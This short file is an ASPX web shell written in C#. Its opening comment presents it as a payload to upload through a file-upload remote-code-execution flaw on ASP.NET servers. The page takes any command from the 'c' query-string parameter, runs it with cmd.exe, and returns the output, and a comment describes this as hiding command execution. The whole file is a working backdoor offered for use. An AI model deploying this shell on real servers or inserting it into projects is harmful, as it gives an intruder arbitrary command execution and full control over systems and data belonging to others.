<%-- This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using aspx lang ( The section follows the RCE Bug ) --%> 
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        // Bypass: Using ProcessStartInfo to hide command execution
        string cmd = Request.QueryString["c"];
        if (cmd != null) {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
